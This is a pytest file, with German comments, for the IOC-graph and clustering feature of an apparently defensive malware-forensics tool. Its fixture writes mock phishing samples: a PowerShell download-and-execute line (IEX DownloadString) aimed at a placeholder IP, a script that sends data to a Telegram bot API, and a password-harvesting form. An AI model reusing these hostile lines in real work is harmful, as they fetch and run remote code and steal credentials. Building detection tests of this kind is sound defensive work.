"""IOC-Graph: geteilte Infrastruktur, Cluster, Layout und Ansicht."""
import os

import pytest

from core.history import HistoryDB
from core.iocgraph import build_graph, layout, graph_from_db
from engines import run_forensic


def _f(i, score=50):
    return {"id": i, "name": f"f{i}", "sha256": f"s{i}", "score": score, "level": "ELEVATED"}


def test_only_shared_non_benign_iocs_and_clusters():
    files = {f"s{i}": _f(i, score=10 * i) for i in range(1, 6)}
    rows = [("s1", "domain", "evil.invalid"), ("s2", "domain", "EVIL.invalid"),
            ("s2", "ipv4", "198.51.100.7"), ("s3", "ipv4", "198.51.100.7"),
            ("s4", "domain", "only-once.invalid"),
            ("s4", "domain", "schemas.microsoft.com"), ("s5", "domain", "schemas.microsoft.com"),
            ("s4", "win_path", "C:\\x"), ("s5", "win_path", "C:\\x")]
    g = build_graph(files, rows)
    assert [i["key"] for i in g["iocs"]] == ["domain:evil.invalid", "ipv4:198.51.100.7"]
    assert set(g["files"]) == {"s1", "s2", "s3"}
    assert len(g["clusters"]) == 1
    c = g["clusters"][0]
    assert c["files"][0] == "s3" and c["max_score"] == 30 and len(c["iocs"]) == 2


def test_similarity_edges_join_clusters_and_sorting():
    files = {f"s{i}": _f(i, score=s) for i, s in ((1, 90), (2, 10), (3, 20), (4, 30))}
    g = build_graph(files, [("s3", "email", "a@b.invalid"), ("s4", "email", "a@b.invalid")],
                    [("s1", "s2", "tlsh 12"), ("s1", "s1", "self")])
    assert [len(c["files"]) for c in g["clusters"]] == [2, 2]
    assert g["clusters"][0]["max_score"] == 90 and g["clusters"][0]["similar_links"] == 1
    assert g["clusters"][0]["name"] == "Cluster 1"


def test_layout_is_deterministic_and_bounded():
    files = {f"s{i}": _f(i) for i in range(6)}
    rows = [(f"s{i}", "domain", "c2.invalid") for i in range(6)]
    g = build_graph(files, rows)
    a, b = layout(g), layout(g)
    assert a == b and len(a) == 7
    assert all(-1.0001 <= x <= 1.0001 and -1.0001 <= y <= 1.0001 for x, y in a.values())
    assert layout(build_graph({}, [])) == {}


def _campaign(tmp_path):
    d = tmp_path / "mails"
    d.mkdir()
    (d / "rechnung.html").write_text('<a href="https://pay-portal.invalid/login">x</a>'
                                     '<script>fetch("https://api.telegram.org/bot1/sendMessage")</script>')
    (d / "mahnung.html").write_text('<form action="https://pay-portal.invalid/p"><input type=password></form>')
    (d / "loader.ps1").write_text("IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a')\n"
                                  "# https://pay-portal.invalid/stage")
    (d / "harmlos.txt").write_text("Einkauf: https://shop.example.invalid/")
    return d


def test_graph_from_history(tmp_path):
    db = HistoryDB(tmp_path / "h.db")
    for p in sorted(_campaign(tmp_path).iterdir()):
        db.record(run_forensic(str(p)))
    g = graph_from_db(db)
    assert "domain:pay-portal.invalid" in {i["key"] for i in g["iocs"]}
    assert len(g["clusters"]) == 1
    names = {g["files"][s]["name"] for s in g["clusters"][0]["files"]}
    assert names == {"rechnung.html", "mahnung.html", "loader.ps1"}
    assert graph_from_db(db, case_id=0, include_similar=False)["clusters"]


def test_graph_view(tmp_path):
    os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")
    QtWidgets = pytest.importorskip("PyQt6.QtWidgets")
    app = QtWidgets.QApplication.instance() or QtWidgets.QApplication([])  # noqa: F841 – Referenz halten
    from gui.history_view import HistoryView
    from gui.graph_view import GraphView
    db = HistoryDB(tmp_path / "h.db")
    hist = HistoryView(db=db)
    view = GraphView(history=hist)
    view.rebuild()
    assert view.lst_clusters.count() == 0                      # leerer Verlauf → Hinweis statt Absturz
    for p in sorted(_campaign(tmp_path).iterdir()):
        db.record(run_forensic(str(p)))
    view.rebuild()
    assert view.lst_clusters.count() == 1 and len(view._file_items) == 3
    view.lst_clusters.setCurrentRow(0)
    assert all(it.opacity() == 1.0 for it in view._file_items.values())
    opened = []
    view.openRequested.connect(opened.append)
    next(iter(view._file_items.values())).mouseDoubleClickEvent(None)
    assert len(opened) == 1
